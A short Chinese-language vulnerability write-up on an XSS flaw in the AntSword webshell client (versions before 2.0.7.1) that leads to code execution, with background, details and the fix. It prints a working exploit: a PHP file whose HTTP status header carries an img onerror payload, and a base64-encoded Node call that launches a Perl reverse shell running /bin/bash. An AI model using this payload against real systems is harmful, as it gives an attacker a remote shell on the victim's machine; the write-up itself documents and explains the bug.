## 漏洞背景

2019.4.12, 有用户在中国蚁剑GitHub上提交了issue，称发现中国蚁剑存在XSS漏洞，借此可引起RCE。据悉，该漏洞是因为在webshell远程连接失败时，中国蚁剑会返回错误信息，但因为使用的是html解析，导致xss漏洞。

## 影响版本

AntSword < v2.0.7.1

## 漏洞详情

当通过中国蚁剑连接webshell，出现连接失败情况时，中国蚁剑会返回错误信息，如下图：
![]()

而该信息并没有进行 XSS 保护，因此能够利用 js 调用 perl 便可反弹攻击者的shell。
![]()

```
<?php header('HTTP/1.1 500 <img src=# onerror=alert(1)>');
```

反弹shell的exp (for perl)如下，使用base64编码：

```
<?php

header("HTTP/1.1 406 Not <img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BlcmwgLWUgXCd1c2UgU29ja2V0OyRpPSIxMjcuMC4wLjEiOyRwPTEwMDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTtcJycsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsKICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOwogIH0pOw==`,`base64`).toString())'>");
?>
```

base64_decode code

```
require('child_process').exec('perl -e \'use Socket;$i="127.0.0.1";$p=1002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'',(error, stdout, stderr)=>{
    alert(`stdout: ${stdout}`);
  });
```

成功反弹攻击者shell：
![]()

## 漏洞修复

在最新的版本中，为了防止插件中 toastr 出现类似问题, 修改了 toastr 可以输出 html 的特点，以后均不支持输出 html。
